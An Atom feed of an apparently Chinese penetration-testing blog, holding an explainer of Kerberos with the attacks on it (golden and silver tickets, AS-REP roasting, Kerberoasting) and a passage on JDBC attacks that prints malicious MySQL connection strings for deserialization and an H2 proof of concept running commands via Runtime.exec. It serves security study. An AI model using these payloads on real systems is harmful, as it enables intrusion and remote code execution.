<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>maoblog</subtitle>
  <link href="https://cyxsec.github.io/atom.xml" rel="self"/>
  
  <link href="https://cyxsec.github.io/"/>
  <updated>2024-09-27T10:24:01.373Z</updated>
  <id>https://cyxsec.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>生活案例举例教你搞定难懂的Kerberos认证过程</title>
    <link href="https://cyxsec.github.io/2024/09/%E7%94%9F%E6%B4%BB%E6%A1%88%E4%BE%8B%E4%B8%BE%E4%BE%8B%E6%95%99%E4%BD%A0%E6%90%9E%E5%AE%9A%E9%9A%BE%E6%87%82%E7%9A%84Kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B/"/>
    <id>https://cyxsec.github.io/2024/09/%E7%94%9F%E6%B4%BB%E6%A1%88%E4%BE%8B%E4%B8%BE%E4%BE%8B%E6%95%99%E4%BD%A0%E6%90%9E%E5%AE%9A%E9%9A%BE%E6%87%82%E7%9A%84Kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B/</id>
    <published>2024-09-25T05:53:20.000Z</published>
    <updated>2024-09-27T10:24:01.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a class="markdownIt-Anchor" href="#序"></a> 序</h1><p>Kerberos认证过程之前学过、看过、抓包分析过很多遍，在很长时间不打AD之后又忘的差不多了，重新看起来又要花费不少的时间。我相信不止我一个人有这方面的烦恼，于是该篇结合一些个人思路，拿生活中的案例举例，让大家更好的理解和记忆住Kerberos的完整认证过程。</p><p><strong>注：本文仅分析了大致的交互过程，PAC等未涉及</strong></p><h1 id="0x01-kerberos基本概念"><a class="markdownIt-Anchor" href="#0x01-kerberos基本概念"></a> 0x01 Kerberos基本概念</h1><p>Kerberos是一套安全认证协议，他的出现主要为了解决“证明你是你”的问题，让客户端和服务端建立信任机制。</p><p>如果让互不认识的甲乙互相见面，双方怎么知道对方真的是本人呢？一般的解决办法都是一个证件或者信物，证明他们自己的身份，来保证信任关系。</p><p>Kerberos协议涉及了一个第三方角色KDC来分别确认双方的身份。</p><p>在完整的Kerberos协议模型中主要包含三个角色概念：</p><ul><li><p>客户端：发起服务请求的角色</p></li><li><p>服务端：提供服务访问的角色</p></li><li><p>密钥分发中心（Key Distribution Center 简称<code>KDC</code>），KDC作为活动目录域服务ADDS的一部分运行在每个域控制器上。而KDC又分为两部分：</p><p>1.认证服务（Authentication Service 简称<code>AS</code>）：主要做客户端的认证</p><p>2.票据授予服务（Ticket Granting Service 简称<code>TGS</code>）: 主要做凭证生成</p></li></ul><p>大致过程如下：</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Ckerberos2.png" alt="kerberos2" /></p><p>在讲解具体的认证过程前，需要先明确Kerberos着重解决了什么问题：</p><ol><li><strong>密码安全传输问题</strong>：采用加密的票据（ticket）和会话密钥（session key），用户的密码在认证过程中不会在网络上以明文形式传输，防止密码泄露和中间人攻击。</li><li><strong>重放攻击和身份伪造问题</strong>：使用时间戳和一次性的认证器（Authenticator），结合加密的会话密钥，来防止重放攻击。即使攻击者截获了身份凭证或票据，由于这些凭证是一次性的并带有时间限制，攻击者无法重复使用。</li><li><strong>中心化和统一身份验证</strong>：实现了单点登录（SSO，Single Sign-On），用户只需进行一次身份验证，就可以获取用于访问多个服务的票据，而不需要每次访问服务都重新输入密码。这极大简化了用户体验，并通过中心化的认证服务器统一管理身份验证过程。</li><li><strong>重复密码验证的麻烦</strong>：通过引入 TGT（票据授予票据）和服务票据，使得用户只需一次登录认证，随后可以在整个会话中使用票据与多个服务进行安全通信，而不需要重复输入密码。</li></ol><h1 id="0x02-大厦访客管理系统"><a class="markdownIt-Anchor" href="#0x02-大厦访客管理系统"></a> 0x02 大厦访客管理系统</h1><p>作为乙方去客户现场，走了太多次访客流程。</p><p>一个完整的访客流程大概是：</p><ol><li>提前在访客系统提交申请。</li><li>进入前台，前台验证访客信息</li><li>办理门禁卡</li><li>刷门禁卡进入客户办公楼</li></ol><p>对应着上面Kerberos，这套流程有着不少问题：</p><ol><li>门禁卡过期，就要重新验证访客信息，重复验证很麻烦，如果一个项目持续很久，每次你进客户大厦都严格的一项一项验证访客信息就变得及其麻烦。</li><li>门禁卡遗失后，捡到的人依然可以使用。</li></ol><ul><li>第一个问题，我们在验证完访客信息后，可以考虑生成一个访客证，过期时候还可以使用这个访客证重新申请门禁卡。（当然这个访客证也要考虑丢失的问题）</li><li>第二个问题，在每次验证时，可以在传输的凭证里面保存一些信息，同时这部分信息可以在申请凭证时获得，这样就能保证捡到的人无法直接使用凭证做下一步验证。（因为他们不知道这部分信息）</li></ul><h1 id="0x03kerberos认证过程"><a class="markdownIt-Anchor" href="#0x03kerberos认证过程"></a> 0x03Kerberos认证过程</h1><p>在联系到大厦访客系统前，先要重点明确几点，这样在后续的案例对应的时候，举例子能更清晰：</p><ul><li>Kerberos具备着<strong>防窃听</strong>、<strong>防重放</strong>的特性。</li></ul><p>我们可以先设计一个简易的访客系统，想象如果有近源的攻击者在附近。如果近源攻击者<strong>窃听</strong>、**重放（复制）**了获取的数据，能否可以进行伪造身份，如果可以，我们考虑一点一点优化，最后优化了问题，这个访客系统就是Kerberos的实际案例了。</p><p>因为我们上面提出了这个访客系统的两个问题，我们优先解决第一个问题，那就是增加访客证的办理，这样就把前台拆成了两部分。</p><p>访客证办理处（AS）、门禁卡办理处（TGS）。</p><h2 id="1as请求过程办理访客证"><a class="markdownIt-Anchor" href="#1as请求过程办理访客证"></a> 1.AS请求过程（办理访客证）</h2><h3 id="现实办理访客证"><a class="markdownIt-Anchor" href="#现实办理访客证"></a> 现实办理访客证</h3><p>在我们生活中如何办理访客证呢？可能是如下的步骤：</p><ul><li>先表明自己身份</li><li>前台查看是否进行了预约</li><li>验证身份</li><li>办理访客证（TGT）</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927181711209.png" alt="image-20240927181711209" /></p><p><strong>这个过程中，如果有近源的攻击者会发生什么？</strong></p><ul><li>攻击者在第3步你输入个人信息和短信验证码时，偷听和偷看。（窃听）</li><li>攻击者在第4步你拿到访客证时候，把访客证偷走或偷偷复制一张一样的，这里假设访客证是最普通的那种NFC的了。（重放）</li></ul><p>防止窃听很简单，我们和前台歪比巴卜（加密通话）就可以了，加密通话总要有规律（密钥），这个规律（密钥）怎么让双方都已知，而且不被窃听呢？</p><ul><li>使用预约记录的信息做规律就可以了，这样就避免了密钥传输的安全性问题，防止被窃听。</li></ul><p>如何防止访客证被偷或者被复制呢？</p><ul><li>利用上面的思路，我们可以要求在使用访客证办理门禁卡的时候，必须和门禁卡办理人员加密通话（说明这张访客证是谁的）才能用。</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927181731240.png" alt="image-20240927181731240" /></p><p><strong>加密通话真的就安全吗？</strong></p><p>回到上面的案例：第3步我们和前台”歪比歪比、歪比巴卜“认证信息。攻击者在我们旁边，偷偷把对话录下来，虽然他不知道”歪比歪比、歪比巴卜“具体是什么，但是肯定代表了你的认证信息，这样他就可以用一样的语言，申请到访客证，同时使用加密通话使用访客证。怎么解决这个问题呢？</p><ul><li>我们在每次加密通话时，带上说话的时间就可以了，这样每次加密通话的内容都会不一样，就算被复制，前台也可以通过解密知道这句话的时间完全对不上。</li></ul><p><strong>如何处理和门禁卡办理人员的加密通话呢？</strong></p><p>上面分析了，和访客前台加密通话的规律（密钥）是从预约信息中获取的，但是门禁卡的人员是不知道的。</p><ul><li>我们可以在生成访客证的时候，把这个规律放在访客证里面，同时前台把这个规律通过之前的加密方式，在办理访客证的时候同时告知。这样就完成了和门禁卡办理人员的加密通话问题。</li></ul><h3 id="优化后的办理流程"><a class="markdownIt-Anchor" href="#优化后的办理流程"></a> 优化后的办理流程</h3><p>整理一下现在的办理流程：</p><ol><li>用户向前台表明身份</li><li>前台查询预约信息</li><li>加密通话认证信息</li><li>办理访客证+和后续门禁卡办理人员的加密通话密钥</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927181751970.png" alt="image-20240927181751970" /></p><p>再分析一下步骤，我们没必要等着前台回复是否查到预约记录，直接把1，3步骤整合在一起。</p><p>前台通过查询我们的预约信息，发现可以成功解密“加密通话”，那其实也就证明了我们的身份。</p><p><strong>那我们第3步的加密通话应该说什么呢？</strong></p><p>上面我们分析了，一定要防止别人偷听，也就是每次的加密通话都要不一样，我们可以采取“当前时间”的方式。</p><p>我们的密钥也要传递进去吗？</p><p>不需要，因为我们本身加密通话就是使用规律（密钥）加密的，已经证明了我们的身份，没必要使用<strong>密钥去加密密钥</strong>传递过去。</p><p>最终优化好的办理流程如下：</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927181809716.png" alt="image-20240927181809716" /></p><h3 id="与kerberos协议的对比"><a class="markdownIt-Anchor" href="#与kerberos协议的对比"></a> 与Kerberos协议的对比</h3><p>用户密钥：预约系统的用户信息（<strong>这里的预约系统实际对应了AD的NTDS.dit数据库</strong>）</p><p>TGT：访客证（<strong>因为门禁卡办理处要读取访客证，因此访客证的加密方式一定是门禁卡办理处也要知道的，对应的加密使用了KDC的用户密钥</strong>）</p><p>看回Kerberos的AS请求和响应过程，是不是就变得清晰很多了呢：（直接拿谢公子的图来说了，暂时没找到其他看的清晰的图，自己也懒得画，见谅）</p><ol><li><p>AS-REQ 请求包</p><p>本机向KDC的AS服务（访客证办理处）发送一个认证请求。该请求包中包含如下信息：</p></li></ol><p><strong>· 请求的用户名(cname)。</strong>（访客名称，我是张三）</p><p>**· Authenticator：**这里是用户密钥加密的时间戳，防止重放攻击。（加密通话，歪比歪比）</p><p><strong>· 域名(realm)。</strong></p><p>**· 请求的服务名(sname)：**AS-REQ这个阶段请求的服务都是krbtgt。</p><p><strong>· 加密类型(etype)。</strong></p><p>**· 以及一些其他信息：**如版本号，消息类型，票据有效时间，是否包含PAC，协商选项等。</p><ol start="2"><li><p>AS-REP 响应包</p><p>当KDC的AS服务（访客证办理处）到客户端发来的请求后，从活动目录数据库中取出该用户的密钥（从访客记录中寻找张三登录的信息作为规律），然后用该密钥（规律）对请求包中的Authenticator部分（加密通话）进行解密，如果解密成功，并且时间戳在有效的范围内，则证明请求者提供的用户密钥正确。</p><p>KDC的AS认证服务在成功认证客户端的身份之后，发送AS-REP响应包给客户端。AS-REP响应包中主要包括如下信息：</p><p>**· TGT认购权证：**包含明文的版本号，域名，请求的服务名，以及加密部分enc-part。加密部分用krbtgt密钥加密。加密部分包含Logon Session Key、用户名、域名、认证时间、认证到期时间和authorization-data。authorization-data中包含最重要的PAC特权属性证书，包含用户的RID，用户所在组的RID等。（TGT作为访客证，因为访客证在后面的门禁卡办理处需要读取，因此使用对应密码加密）</p><p>**· enc_Logon Session Key：**使用用户密钥加密Logon Session Key后的值，其作用是用于确保客户端和KDC下阶段之间通信安全。也就是AS-REP中最外层的enc-part。（使用和张三交流的规律，加密新的规律，用于和门禁卡办理处的加密通话）</p><p><strong>· 请求的用户名(cname)。</strong></p><p><strong>· 域名(crealm)。</strong></p><p>**· 以及一些其他信息：**如版本号，消息类型等。</p></li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927182028856.png" alt="image-20240927182028856" /></p><h2 id="2tgs请求过程办理门禁卡"><a class="markdownIt-Anchor" href="#2tgs请求过程办理门禁卡"></a> 2.TGS请求过程（办理门禁卡）</h2><p>和上面的方式类似，只不过我们加密通话的规律（密钥），从个人信息变成了从访客证办理处（AS）获取的。</p><h3 id="优化后的办理流程-2"><a class="markdownIt-Anchor" href="#优化后的办理流程-2"></a> 优化后的办理流程</h3><ul><li><p>把访客证（TGT）递交给门禁卡办理处（TGS），因为访客证（TGT）不能单独使用，需要玛卡巴卡阿卡哇卡（全新的加密通话）。</p></li><li><p>因为加密通话的规律（密钥）存储在访客证（TGT）中，因此门禁卡办理处（TGS）可以获取，也就可以听懂加密通话。（<strong>加密通话的内容，我们上面也分析过，只需要说“当前时间”即可。</strong>）</p></li><li><p>门禁卡办理处（TGS）使用访客证（TGT）中的信息解密我们发出玛卡巴卡阿卡哇卡（加密通话），发现可以成功解密，验证了身份，同时发现**”当前时间“**也对得上，可以验证通过。</p></li><li><p>正常发放门禁卡（ST）+与公司门禁保安的加密通话。加密通话的规律也保存在门禁卡（ST）中，保证门禁卡（ST）不会被捡到的人直接使用。</p></li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927181830512.png" alt="image-20240927181830512" /></p><h3 id="与kerberos协议的对比-2"><a class="markdownIt-Anchor" href="#与kerberos协议的对比-2"></a> 与Kerberos协议的对比</h3><ol><li>TGS-REQ 请求</li></ol><p>客户端拿着上一步获得的TGT（访客证）认购权证发起请求，向TGS（门禁卡办理处）购买针对指定服务的ST（门禁卡）服务票据，该请求主要包含如下信息：</p><p><strong>· TGT认购权证。</strong>（访客证）</p><p>**· Authenticator：**这里使用Logon Session Key加密的时间戳，防止重放攻击。（加密通话，玛卡巴卡）</p><p><strong>· 请求的服务名(sname)。</strong>（客户名）</p><p><strong>· 域名(realm)。</strong></p><p><strong>· 加密类型(etype)。</strong></p><p>**· 以及一些其他信息：**如版本号，消息类型，协商选项，票据到期时间等</p><ol start="2"><li>TGS-REP 响应</li></ol><p>TGS服务（门禁卡办理处）接收到请求之后。首先使用krbtgt密钥解密TGT认购权证中加密部分得到Logon Session key等信息（生成访客证的时候，把规律加密写入了里面，所以门禁卡办理处可以直接读取规律），如果能解密成功则说明该TGT认购权证是KDC颁发的（说明访客证有效）。然后使用Logon Session Key解密Authenticator得到时间戳等信息，如果能够解密成功，并且票据时间在范围内，则验证了会话的安全性。（使用规律成功解密发起的加密通话玛卡巴卡，且验证了时间）在完成上述的检测后，KDC的TGS服务完成了对客户端的认证，TGS服务发送响应包给客户端。响应包中主要包括如下信息：</p><p>**· ST服务票据：**包含明文的版本号，域名，请求的服务名，以及加密部分enc-part，加密部分用服务密钥加密。加密部分包含用户名、域名、认证时间、认证到期时间、Service Session key和authorization-data。authorization-data中包含最重要的PAC特权属性证书，包含用户的RID，用户所在的组的RDI 等。（门禁卡）</p><p>**· enc_Service Session key：**使用Logon Session key加密的Service Session key，其作用是用于确保客户端和KDC下阶段之间通信安全。（使用和访客证的规律，加密新的规律，用于和刷卡处保安的加密通话）</p><p><strong>· 请求的用户名(cname)</strong></p><p><strong>· 域名(crealm)</strong></p><p>**· 以及一些其他信息：**如版本号、消息类型等。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927181908412.png" alt="image-20240927181908412" /></p><h2 id="3server请求过程门禁刷卡"><a class="markdownIt-Anchor" href="#3server请求过程门禁刷卡"></a> 3.Server请求过程（门禁刷卡）</h2><h3 id="与kerberos协议的对比-3"><a class="markdownIt-Anchor" href="#与kerberos协议的对比-3"></a> 与Kerberos协议的对比</h3><ol><li>AP-REQ 请求</li></ol><p>客户端接收到KDC的TGS回复后，通过缓存的Logon Session Key解密enc_Service Session key得到Service Session Key，（通过从访客证办理处获取的规律，拿到新的规律）同时它也拿到了ST(门禁卡)服务票据。Serivce Session Key 和 ST服务票据会被客户端缓存。</p><p>客户端访问指定服务时，将发起AP-REQ请求，该请求主要包含如下的内容：</p><p><strong>· ST服务票据</strong>（门禁卡）</p><p>**· Authenticator：**这里指Serivce Session Key加密的时间戳。（加密通话，妈咪妈咪哄）</p><p>**· 以及一些其他信息：**如版本号、消息类型，协商选项等</p><ol start="2"><li>服务端解码ST，使用其中的sessionKey解码时间戳，发现时间戳没有问题，成功通过验证。</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240927181942847.png" alt="image-20240927181942847" /></p><h1 id="0x04-票据攻击"><a class="markdownIt-Anchor" href="#0x04-票据攻击"></a> 0x04 票据攻击</h1><p>通过我们上面的模型分析，对于黄金票据和白银票据就很好理解了：</p><h2 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据"></a> 黄金票据</h2><ul><li>黄金票据就是在<strong>访客证办理处</strong>出现了内鬼，导致可以伪造出一个完整的访客证，同时也能解决加密通话的问题，导致可以随便申请门禁卡，想去哪就去哪。（访客证的加密是使用了门禁卡办理处的密码，因为门禁卡办理处要解密识别）</li></ul><p>具体伪造需要什么呢，其实就是TGT（访客证）包含的东西：</p><p>1、域名称(shell net config workstation )<br />2、域的SID值(shell whoami /user)<br />3、域的KRBTGT账号的HASH （门禁卡办理处的密码）<br />4、任意用户名</p><h2 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据"></a> 白银票据</h2><ul><li>白银票据就是在<strong>门禁卡办理处</strong>出现了内鬼，导致伪造出一个完整的门禁卡，同时也能解决加密通话问题，伪造的门禁卡可以刷卡指定公司的门禁。（门禁卡的加密是使用了指定公司的密码，因为公司处要解密识别）</li></ul><p>伪造ST（门禁卡）需要：</p><p>1.域名称(shell net config workstation )<br />2.域的SID值(shell whoami /user)<br />3.目标服务器名<br />4.可利用的服务<br />5.服务账号的NTML HASH（指定公司的密码）<br />6.需要伪造的用户名</p><p><strong>为什么伪造的ST（门禁卡）叫做白银票据呢？因为我们发现，伪造的ST（门禁卡）的用途有限，只能对指定服务（公司）使用，而伪造TGT（访客证）却可以申请到任意服务（公司）的门禁卡。白银比黄金差一些</strong></p><h1 id="0x05-认证流程攻击"><a class="markdownIt-Anchor" href="#0x05-认证流程攻击"></a> 0x05 认证流程攻击</h1><h2 id="as_req请求办理访客证"><a class="markdownIt-Anchor" href="#as_req请求办理访客证"></a> AS_REQ（请求办理访客证）</h2><ol><li><strong>PTH</strong></li></ol><p>这个就不举实例了，这个很好理解，就是在整个验证的时候使用的不是明文，而是Hash，或者说是Hash和处理过的Hash（处理过的Hash就是上面说的加密通话的规律），获取用户的hash就可以进行认证利用，而不是完整明文。</p><ol start="2"><li><strong>域内用户枚举</strong></li></ol><p>回到实例，我们在办理访客证时会说明身份，但是如果未在预约信息中，前台肯定会给出提醒，说我们没有做预约（找不到规律去解密加密通话），我们就可以利用这个特性来测试谁预约过了。（域内是否存在某用户）</p><ol start="3"><li><strong>密码喷洒攻击</strong></li></ol><p>我们如果偶然间获取了某位用户的加密通话规律，但是不知道具体是谁的。显然可以去前台说出大量用户名进行批量尝试。</p><h2 id="as_rep访客证攻击"><a class="markdownIt-Anchor" href="#as_rep访客证攻击"></a> AS_REP（访客证攻击）</h2><ol><li><strong>黄金票据</strong></li></ol><p>上面分析过</p><ol start="2"><li><strong>AS-REP Roasting攻击</strong></li></ol><p>域用户有一个&quot;Do not require Kerberos preauthentication”不需要预认证选项（默认不开启）</p><p>在实例中可以理解为，不验证用户发出的加密通话。这样就可以直接拿到TGT（访客证）和下次加密通话的规律（但是这个规律也是拿用户Hash做加密的）</p><p>我们可以对这个&quot;下次加密通话的规律&quot;使用字典尝试破解，因为是对称加密，所以尝试破解，这样可以尝试拿到用户的明文密码。</p><h2 id="tgs_rep门禁卡攻击"><a class="markdownIt-Anchor" href="#tgs_rep门禁卡攻击"></a> TGS_REP（门禁卡攻击）</h2><ol><li><strong>白银票据</strong></li></ol><p>上面分析过</p><ol start="2"><li><strong>Kerberosasting 攻击</strong></li></ol><p>我们知道ST（门禁卡）是使用对应服务（公司）的密码加密的，因为是对称加密，所以可以使用字典爆破。尝试破解获取服务Hash（公司密码）。</p><p>这个攻击能进行的原因也有：用户使用TGT可以申请任意服务的ST，因为这个步骤没有对用户是否可以访问该服务做验证。</p><p>这样我们拿到某个域用户的凭证后，即可考虑向所有服务请求ST，然后进行破解。</p><p><strong>上面我们能爆破用户和服务的密码，为什么不能爆破KDC的密码呢？</strong></p><p>因为krbtgt的密码是随机生成的，爆破不出来。</p><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://cloud.tencent.com/developer/article/2227940#:~:text=%E7%A4%BE%E5%8C%BA%E9%A6%96%E9%A1%B5%20%3E%20%E4%B8%93">https://cloud.tencent.com/developer/article/2227940#:~:text=社区首页 &gt; 专</a></p><p><a href="https://xz.aliyun.com/t/15367?time__1311=GqjxnD2DyDRDcDRx05DKg%2BEb2xqQu00pD#toc-6">https://xz.aliyun.com/t/15367?time__1311=GqjxnD2DyDRDcDRx05DKg%2BEb2xqQu00pD#toc-6</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#序&quot;&gt;&lt;/a&gt; 序&lt;/h1&gt;
&lt;p&gt;Kerberos认证过程之前学过、看过、抓包分析过很多遍，在很长时间不打AD之后又忘的差不多了，重新看起来又要花费不少的时间。我相信不止我一个人有这方</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://cyxsec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc攻防指北</title>
    <link href="https://cyxsec.github.io/2024/09/Jdbc%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/"/>
    <id>https://cyxsec.github.io/2024/09/Jdbc%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/</id>
    <published>2024-09-19T02:59:51.000Z</published>
    <updated>2024-10-18T10:17:35.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-序"><a class="markdownIt-Anchor" href="#0x00-序"></a> 0x00 序</h1><p>JDBC（Java DataBase Connectivity，java数据库连接）是一种用于执行Sql语句的Java  Api，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。</p><p>JDBC攻击主要是当连接字符串可控时，利用数据库特性执行语句，达到漏洞利用的效果。</p><h1 id="0x01-mysql"><a class="markdownIt-Anchor" href="#0x01-mysql"></a> 0x01 Mysql</h1><h2 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h2><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241017181518882.png" alt="image-20241017181518882" /></p><h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本：</h3><p>fnmsd大哥总结的：</p><p>不同版本的参数不太一样</p><p>ServerStatusDiffInterceptor触发：</p><pre class="line-numbers language-none"><code class="language-none">8.x:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc6.x(属性名不同):jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc5.1.11及以上的5.x版本（包名没有了cj）:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。5.0.x: 还没有ServerStatusDiffInterceptor这个东西┓( ´∀&#96; )┏<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>detectCustomCollations触发：</p><pre class="line-numbers language-none"><code class="language-none">5.1.41及以上: 不可用5.1.29-5.1.40:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc5.1.28-5.1.19：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc5.1.18以下的5.1.x版本： 不可用5.0.x版本不可用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="触发过程"><a class="markdownIt-Anchor" href="#触发过程"></a> <strong>触发过程：</strong></h3><p>研究过反序列化的都知道，原生的反序列化找输入流对象的readObject方法即可。</p><p>在mysql的依赖里面寻找一下：</p><p><code>com.mysql.cj.jdbc.result.ResultSetImpl#getObject(int)</code></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241017150848927.png" alt="image-20241017150848927" /></p><p>再寻找调用处：</p><p><code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></p><p>看类名也知道是拦截器，JDBC连接字符串设置queryInterceptors属性的值即可进入，且默认会调用preProcess和postProcess方法</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241017153111316.png" alt="image-20241017153111316" /></p><p>漏洞的攻击流程就很清晰了：</p><ol><li>默认会触发设置的拦截器，会调用相关方法</li><li>执行show session status获取相关结果</li><li>触发反序列化</li></ol><p>因此我们攻击就要：</p><ol><li>设置好JDBC连接字符串参数</li><li>伪造好show查询的结果做返回</li></ol><p><a href="https://xz.aliyun.com/t/9250">https://xz.aliyun.com/t/9250</a></p><p>这篇文章详细分析了如何构造show查询的结果，此处就不做详细分析。</p><p><a href="https://github.com/Y4Sec-Team/mysql-jdbc-trick">https://github.com/Y4Sec-Team/mysql-jdbc-trick</a></p><p>实战中可能遇见waf过滤关键参数，看这篇4ra1n写的文章即可，有一些默认解码的trick。</p><h2 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h2><p>这个本质是mysql协议本身的设计缺陷，因此不仅仅影响jdbc_mysql。</p><ul><li>mysql client (pwned)</li><li>php mysqli (pwned，fixed by 7.3.4)</li><li>php pdo (默认禁用)</li><li>python MySQLdb (pwned)</li><li>python mysqlclient (pwned)</li><li>java JDBC Driver (pwned，影响的版本是<strong>8.0.29之前</strong>的版本，主要取决于<code>allowLoadLocalInfile</code>参数)</li><li>navicat （pwned)</li></ul><p><a href="https://paper.seebug.org/1112/">https://paper.seebug.org/1112/</a></p><p>核心的原理如上面文章所说：</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241017164051322.png" alt="image-20241017164051322" /></p><p>实现流程： 1.回复mysql client一个greeting包 2.等待client端发送一个查询包 3.回复一个file transfer包</p><p>这也就完成了文件读取，实际攻防中很多蜜罐都使用了此方式。</p><p><strong>实战中有两点常见的：1.phpmyadmin支持（&lt; 4.8.5）。2.mysql读文件支持phar://伪协议触发phar反序列化</strong></p><h1 id="0x02-h2"><a class="markdownIt-Anchor" href="#0x02-h2"></a> 0x02 H2</h1><p>h2支持java语句，因此可以利用此特性执行命令</p><h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h2><p>这个中间有些版本无法执行成功，具体范围未作测试。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241017181531149.png" alt="image-20241017181531149" /></p><h3 id="init-runscript-rce"><a class="markdownIt-Anchor" href="#init-runscript-rce"></a> INIT RunScript RCE：</h3><p>简单就是连接的时候，支持传入参数，执行一段初始化的脚本，脚本内容我们自定义执行java语句就可以了。</p><p>这个利用方式需要机器出网，因为要远程加载脚本。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241017174155850.png" alt="image-20241017174155850" /></p><p><strong>有个小tips:后面的.sql不是必须的，可以省略</strong></p><h3 id="alias-script-rce"><a class="markdownIt-Anchor" href="#alias-script-rce"></a> Alias Script RCE：</h3><p>上面分析到了，可以加载脚本，实际上也可以直接创建别名执行，注意；要转义</p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.sql.Connection;import java.sql.DriverManager;import java.sql.SQLException;public class H2 &#123;    public static void main(String[] args) &#123;        String poc &#x3D; &quot;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\&quot;A\&quot;)\\; return s.hasNext() ? s.next() : \&quot;\&quot;\\;  &#125;$$\\;CALL SHELLEXEC(&#39;calc&#39;)\\;&quot;;        String new_url &#x3D; &quot;jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;&quot;+poc;        try&#123;            Connection con &#x3D; DriverManager.getConnection(new_url);        &#125;catch (SQLException ex) &#123;            ex.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241017175147410.png" alt="image-20241017175147410" /></p><p>对比上面的方法各有优劣，此方法不需要出网，但是遇见waf就很烦了。</p><h2 id="实战案例"><a class="markdownIt-Anchor" href="#实战案例"></a> 实战案例</h2><p><strong>致远OA：</strong></p><p><a 